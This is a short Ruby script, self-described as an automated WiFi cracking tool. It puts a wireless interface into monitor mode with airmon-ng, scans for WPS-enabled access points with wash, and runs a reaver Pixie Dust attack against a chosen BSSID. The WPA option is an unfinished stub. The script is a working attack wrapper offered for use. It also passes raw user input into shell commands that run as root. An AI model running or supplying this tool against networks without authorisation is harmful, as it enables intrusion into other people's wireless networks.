#!/usr/bin/ruby
#Automated WIFI cracking tool by CryogenicFreeze
def init
	print 'Installing required gem... '
	system 'gem install colorize >/dev/null'
	require 'colorize'
	puts 'Done'.green
	system 'clear'
	raise 'This program must be run as root. Quitting!' unless Process.uid == 0
	start
end

def start
	puts 'Enter wireless interface(if you want to see available interfaces then enter "view")'
	print 'Or if a monitor interface is already setup enter "Skip" :'; inface = gets.chomp
	case inface
	when "view"
		system 'ls -1 /sys/class/net'
	when "View"
		system 'ls -1 /sys/class/net'
	when "skip"
		print 'Enter the monitor interface: '; mon = gets.chomp
		choose_attack(mon)
	else
		puts "Are you sure you want to start monitor mode on #{inface}?" 
		print "you will be disconnected from the internet. Continue?(y/n): "
		continue = gets.chomp
		case continue
		when 'y', 'Y'
			print 'Killing processes... '; system 'airmon-ng check kill >/dev/null'; puts 'Done'.green
			print "Starting #{inface} in monitor mode... "; system "airmon-ng start #{inface} >/dev/null"; puts 'Done'.green
			inface = "#{inface}mon"; puts "The new interface is #{inface}"
			choose_attack(inface)
		when 'n', 'N'
			puts 'Quitting... '; exit
		else
			puts "Invalid input"
		end
	end
end

def choose_attack(interface)
	@interface = interface
	print "What kind of attack do you want to do?(wps/wpa): "
	type = gets.chomp
	case type
	when 'wps'
		wps = Attacks.new
		wps.wps(@interface)
	when 'wpa'
		wpa = Attacks.new
		wpa.wpa(@interface)
	else
		puts 'Invalid input!'
	end	
end

class Attacks
	def initialize
	end
	def wps(interface)
		@interface = interface
		puts 'Timing out in 25 seconds... '
		system "timeout 25 wash -i #{@interface}"
		print 'Enter targets bssid: '
		@bssid = gets.chomp
		system 'clear'; system "reaver -i #{@interface} -b #{@bssid} -K 1"
	end

	def wpa(interface)
		@interface = interface
		puts 'Not available yet!'; exit
	end
end
init
